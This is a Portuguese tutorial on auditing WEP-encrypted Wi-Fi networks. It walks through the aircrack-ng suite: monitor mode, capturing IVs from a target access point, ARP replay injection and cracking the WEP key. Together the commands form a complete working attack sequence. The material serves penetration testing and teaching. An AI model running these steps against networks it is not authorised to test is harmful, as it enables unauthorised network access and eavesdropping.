# Auditoria de Segurança em Redes WEP

Este guia descreve os passos e comandos utilizados para realizar uma auditoria de segurança em uma rede sem fio com criptografia WEP (Wired Equivalent Privacy).

---

### 1. Ver os parâmetros da interface de rede

Antes de iniciar, é importante verificar as configurações da sua interface de rede wireless.

```bash
iwconfig
````

-----

### 2\. Colocar a interface em modo monitor

O modo monitor permite que uma interface wireless escute todos os pacotes que estão no ar, sem precisar estar conectada a uma rede específica. Isso é útil para tarefas de monitoramento de redes, captura de pacotes e realização de auditorias de segurança, como análise de vulnerabilidades de redes Wi-Fi e captura de handshakes em ataques de força bruta.

```bash
airmon-ng start wlan0
```

*Substitua `wlan0` pela sua interface de rede, se necessário.*

-----

### 3\. Capturar e monitorar o tráfego de redes sem fio

Quando a interface está no modo monitor, este comando coleta informações sobre as redes Wi-Fi ao alcance e pode capturar pacotes de dados. É amplamente usado em auditorias de segurança de rede.

```bash
airodump-ng wlan0mon
```

*O nome da interface pode mudar para `wlan0mon` após ativar o modo monitor.*

**Colunas do `airodump-ng`:**

  - **BSSID**: Endereço MAC do ponto de acesso.
  - **PWR**: A potência do sinal (quanto mais próximo de 0, mais forte o sinal).
  - **\#Data**: Pacotes de dados capturados do ponto de acesso.
  - **CH**: O canal em que o ponto de acesso está operando.
  - **MB**: Velocidade máxima suportada pela rede.
  - **ENC**: O tipo de criptografia usada (WEP, WPA, WPA2, WPA3).
  - **ESSID**: O nome da rede (SSID).

-----

### 4\. Capturar pacotes de uma rede específica

Para focar em um alvo específico e otimizar a captura, direcione o `airodump-ng` para o canal e BSSID da rede desejada. Para WEP, é necessário capturar apenas os pacotes IVs (Initialization Vectors), que são essenciais para quebrar a criptografia.

```bash
airodump-ng --ivs --channel [canal_do_ap] --bssid [bssid_do_ap] --write arquivo_de_captura wlan0mon
```

  - `--ivs`: Salva apenas os IVs, filtrando pacotes desnecessários.
  - `--channel`: Define o canal do ponto de acesso.
  - `--bssid`: Define o MAC address do ponto de acesso.
  - `--write`: Define o prefixo do arquivo onde os pacotes serão salvos (ex: `arquivo_de_captura.ivs`).

-----

### 5\. Injetar pacotes para acelerar a captura (Ataque de Replay de ARP)

Em redes WEP, pode-se realizar um ataque de replay de ARP para injetar pacotes na rede. Isso gera uma quantidade maior de tráfego e, consequentemente, acelera a coleta do grande número de IVs necessários para quebrar a chave WEP.

```bash
aireplay-ng --arpreplay -b [bssid_do_ap] -h [mac_do_cliente] wlan0mon
```

  - `--arpreplay`: Inicia o ataque de replay de ARP.
  - `-b`: O BSSID do ponto de acesso alvo.
  - `-h`: O endereço MAC de um cliente legítimo conectado à rede (obtido com o `airodump-ng`).

-----

### 6\. Quebrar a chave WEP

Com um número suficiente de IVs capturados, o `aircrack-ng` pode ser usado para analisar os pacotes e descobrir a chave de criptografia por força bruta.

```bash
aircrack-ng -b [bssid_do_ap] arquivo_de_captura*.ivs
```

  - `-b`: Especifica o BSSID do ponto de acesso.
  - `arquivo_de_captura*.ivs`: O(s) arquivo(s) de captura contendo os IVs. O asterisco (`*`) é usado caso o airodump tenha criado múltiplos arquivos.

<!-- end list -->

```
